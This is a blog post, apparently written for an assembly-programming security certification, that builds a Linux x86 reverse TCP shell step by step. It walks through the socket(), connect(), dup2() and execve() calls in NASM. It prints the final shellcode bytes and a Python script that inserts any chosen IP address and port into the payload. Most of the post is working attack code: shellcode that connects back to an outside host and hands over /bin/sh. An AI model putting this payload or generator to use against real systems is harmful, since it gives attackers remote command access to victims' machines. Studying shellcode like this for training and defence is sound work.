Introduction
------------
Reverse TCP shell consist of three elements, one for setting up socket that includes [socket()](http://man7.org/linux/man-pages/man2/socket.2.html), [connect()](http://man7.org/linux/man-pages/man2/connect.2.html) functions. The second is [dup2()](http://man7.org/linux/man-pages/man2/dup.2.html) for file descriptors, and the last part [execve()](http://man7.org/linux/man-pages/man2/execve.2.html) is used to spawn shell upon successful TCP connection. Please note that most of the syscalls mentioned here have already been covered in my previous blog post [TCP Bind](https://ihack4falafel.github.io/Creating-Custom-TCP-Bind-Shell-~-Linux-x86/), hence this post will only focus on [connect()](http://man7.org/linux/man-pages/man2/connect.2.html) function, which is the main difference between bind and reverse shell! The post will then conclude by tying all the pieces together to create working shellcode.

socket()
--------
`socket()` is used to create medium for communication, for more information on this function please refer to [TCP Bind](https://ihack4falafel.github.io/Creating-Custom-TCP-Bind-Shell-~-Linux-x86/) blog post. let’s code!

```nasm
global _start

section .text

_start:
 
    ; zero out registers
    xor eax, eax 
    xor ebx, ebx
    xor edx, edx
    xor esi, esi

    ; 
    ; socket() code block
    ;

    ; push NULL for protocol type
    push eax

    ; __NR_socketcall 102
    mov al, 0x66

    ; #define SYS_SOCKET 1
    inc bl

    ; push 1 for SOCK_STREAM
    push byte 0x1

    ; push 2 for AF_INET
    push byte 0x2

    ; store arguments in ECX, ping kernel!
    mov ecx, esp
    int 0x80
```

connect()
---------
This is where we’re going to spend most of our time, `connect()` function basically connect a socket referred to by `sockfd` file descriptor to an address specified by `addr`, and it consist of three arguments as shown below:

```C
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```

`sockfd` is used to point to `socket()` created earlier, hence we will save its address to `ESI`. `addr` is where we specify our desired IP address and it’s broken down to three parts as shown below:

```C
struct sockaddr_in {
               sa_family_t    sin_family; /* address family: AF_INET */
               in_port_t      sin_port;   /* port in network byte order */
               struct in_addr sin_addr;   /* internet address */
           };
```

Now `sin_family` is pretty self-explanatory so will go with `AF_INET`, which according to the first code block in `socket()` translates to `2`.  Also we’ll go with `1337` for `sin_port` and `192.168.80.129` for `sin_addr` both values needs to be pushed in network byte order `big-endian`, and here’s why [RFC1700](https://tools.ietf.org/html/rfc1700). The last argument would be `addrlen` which defines the size of `addr` in bytes, `16` in our case. Let’s identify id for `connect()` function `EBX`.

```sh
root@falafel:~$ cat /usr/include/linux/net.h | grep SYS_CONNECT
#define SYS_CONNECT	3		/* sys_connect(2)		*/
root@falafel:~$ 
```

Back to the terminal

```nasm
    ; 
    ; connect() code block
    ; 

    ; move sockfd to ESI
    mov esi, eax

    ; __NR_socketcall 102
    mov al, 0x66

    ; #define SYS_CONNECT 3
    pop ebx
    inc ebx
    pop edi

    ; push 192.168.80.129 for sin_addr
    push 0x8150a8c0

    ; push 1337 for sin_port
    push word 0x3905

    ; push 2 for sin_family
    push word 0x2

    ; push 16 for socketlen_t
    push byte 16

    ; store ESP pointer (sockaddr) in ECX
    push ecx

    ; push ESI for sockfd
    push esi

    ; save arguments pointer to ECX, ping kernel!
    mov ecx, esp
    int 0x80
```

dup2()
------
`dup2()` is used to duplicate file descriptors, for more information on this function please refer to [TCP Bind](https://ihack4falafel.github.io/Creating-Custom-TCP-Bind-Shell-~-Linux-x86/) blog post. some more code!

```nasm
    ;
    ;dup2() code block
    ; 

    ; store sockfd in EBX
    xchg esi, ebx

    ; reset ECX for newfd loop
    xor ecx, ecx

    ; set counter to 2
    add cl, 0x2

    ; loop for stdin, stdout, and stderr
    ; syscall for __NR_dup2 63
    ; ping kernel 3 times!

dup:
    mov al, 0x3f
    int 0x80
    dec cl
    jns dup
```

execve()
--------
`execve()` is used to execute a program, for more information on this function please refer to [TCP Bind](https://ihack4falafel.github.io/Creating-Custom-TCP-Bind-Shell-~-Linux-x86/) blog post.

```nasm
    ;
    ;execve() code block
    ;

    ; push NULL followed by "/bin//sh" for filename
    push eax
    push 0x68732f2f
    push 0x6e69622f

    ; store ESP pointer to "/bin//sh" in EBX
    mov ebx, esp

    ; save arguments pointer to ECX
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp

    ;__NR_execve 11, ping kernel!
    mov al, 0xb
    int 0x80
```

Final Shellcode
---------------
Now that we have all the pieces of the puzzle, let’s compile and test and then create python script that takes an IP address and port number and add it to our custom shellcode, here’s final code.

```nasm
global _start

section .text

_start:
 
    ; zero out registers
    xor eax, eax 
    xor ebx, ebx
    xor edx, edx
    xor esi, esi

    ; 
    ; socket() code block
    ;

    ; push NULL for protocol type
    push eax

    ; __NR_socketcall 102
    mov al, 0x66

    ; #define SYS_SOCKET 1
    inc bl

    ; push 1 for SOCK_STREAM
    push byte 0x1

    ; push 2 for AF_INET
    push byte 0x2

    ; store arguments in ECX, ping kernel!
    mov ecx, esp
    int 0x80

    ; 
    ; connect() code block
    ; 

    ; move sockfd to ESI
    mov esi, eax

    ; __NR_socketcall 102
    mov al, 0x66

    ; #define SYS_CONNECT 3
    pop ebx
    inc ebx
    pop edi

    ; push 192.168.80.129 for sin_addr
    push 0x8150a8c0

    ; push 1337 for sin_port
    push word 0x3905

    ; push 2 for sin_family
    push word 0x2

    ; push 16 for socketlen_t
    push byte 16

    ; store ESP pointer (sockaddr) in ECX
    push ecx

    ; push ESI for sockfd
    push esi

    ; save arguments pointer to ECX, ping kernel!
    mov ecx, esp
    int 0x80

    ;
    ;dup2() code block
    ; 

    ; store sockfd in EBX
    xchg esi, ebx

    ; reset ECX for newfd loop
    xor ecx, ecx

    ; set counter to 2
    add cl, 0x2

    ; loop for stdin, stdout, and stderr
    ; syscall for __NR_dup2 63
    ; ping kernel 3 times!

dup:
    mov al, 0x3f
    int 0x80
    dec cl
    jns dup

    ;
    ;execve() code block
    ;

    ; push NULL followed by "/bin//sh" for filename
    push eax
    push 0x68732f2f
    push 0x6e69622f

    ; store ESP pointer to "/bin//sh" in EBX
    mov ebx, esp

    ; save arguments pointer to ECX
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp

    ;__NR_execve 11, ping kernel!
    mov al, 0xb
    int 0x80
```

Here’s graphical version of it.

![](/assets/images/Creating_Custom_TCP_Reverse_Shell_Linux_x86/ReverseShell.png)

Demo time!

[![Reverse Shell Demo](https://github.com/ihack4falafel/ihack4falafel.github.io/blob/master/assets/images/chmod.png)](https://player.vimeo.com/video/251336835?dnt=1&app_id=122963 "Click to Watch!")

Let’s dump shellcode and then use it to create python script.

```sh
ihack4falafel@ubuntu:~$ objdump -d ./ReverseShell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\x31\xd2\x31\xf6\x50\xb0\x66\xfe\xc3\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x5b\x43\x5f\x68\xc0\xa8\x50\x81\x66\x68\x05\x39\x66\x6a\x02\x6a\x10\x51\x56\x89\xe1\xcd\x80\x87\xf3\x31\xc9\x80\xc1\x02\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
ihack4falafel@ubuntu:~$
```

Here’s the script

```python
#!/usr/bin/python
#---------------------------------------------------------------------------------------------#
# Script        = ReverseShell.py                                                             #
# SLAE-ID       = SLAE-1115                                                                   #
# Description   = Custom Reverse Shell with configurable ip and port                          #
# Date          = 1/16/2018                                                                   #
# Author        = @ihack4falafel                                                              #
# Usage         = python ReverseShell.py <ip> <port>                                          #
#---------------------------------------------------------------------------------------------#

import sys

#---------------#---------#
W  = '\033[0m'  # White   #
P  = '\033[35m' # Purple  #
Y  = '\033[33m' # Yellow  #
#---------------#---------#

# Check ip and port input
if len(sys.argv) < 3:
  print Y+ "Usage               :" + P+  " python BindShell.py <ip> <port>               " +W
  print Y+ "Example             :" + P+  " python BindShell.py 192.168.80.129 1337       " +W
  sys.exit(0)

ip = sys.argv[1]
port = int(sys.argv[2])

# Make sure port is good!
if port < 1 or port > 65535:
  print P+ "Please specify port number between 1 and 65535" +W
  exit()

if port <= 1024:
  print P+ "This port require root privileges!" +W

# Change port to Shellcode 
port_shellcode = format(port, '04x')
port_shellcode = "\\x" + str(port_shellcode[0:2]) + "\\x" + str(port_shellcode[2:4])  

# Change ip to Shellcode
octet1, octet2, octet3, octet4 = ip.split('.')
ip_shellcode = "\\x" + format(int(octet1), '02x') + "\\x" + format(int(octet2), '02x') + "\\x" + format(int(octet3), '02x') + "\\x" + format(int(octet4), '02x')

# Print final Shellcode, and highlight ip and port in yellow ;)
print P+ "\\x31\\xc0\\x31\\xdb\\x31\\xd2\\x31\\xf6\\x50\\xb0\\x66\\xfe\\xc3\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\x5b\\x43\\x5f\\x68" + Y+ ip_shellcode + P+ "\\x66\\x68" + Y+ port_shellcode + P+ "\\x66\\x6a\\x02\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\x87\\xf3\\x31\\xc9\\x80\\xc1\\x02\\xb0\\x3f\\xcd\\x80\\xfe\\xc9\\x79\\xf8\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80" +W
```

Running the script with same ip address and port will output exact same shellcode generated earlier!

```sh
ihack4falafel@ubuntu:~$ python ReverseShell.py 192.168.80.129 1337
\x31\xc0\x31\xdb\x31\xd2\x31\xf6\x50\xb0\x66\xfe\xc3\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x5b\x43\x5f\x68\xc0\xa8\x50\x81\x66\x68\x05\x39\x66\x6a\x02\x6a\x10\x51\x56\x89\xe1\xcd\x80\x87\xf3\x31\xc9\x80\xc1\x02\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
ihack4falafel@ubuntu:~$ 
```

Closing Thoughts
----------------
This post is continuation of [TCP Bind](https://ihack4falafel.github.io/Creating-Custom-TCP-Bind-Shell-~-Linux-x86/) one, hence did not have much information outside what we’ve already learned. Feel free to contact me for questions via twitter [@ihack4falafel](https://twitter.com/ihack4falafel) . All of the code is available on on my github as shown in the link below. Hope this post has been a good resource and I’d like to thank you for viewing!

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1115

GitHub Repo: [https://github.com/ihack4falafel/SLAE32/tree/master/Assignment%202](https://github.com/ihack4falafel/SLAE32/tree/master/Assignment%202)
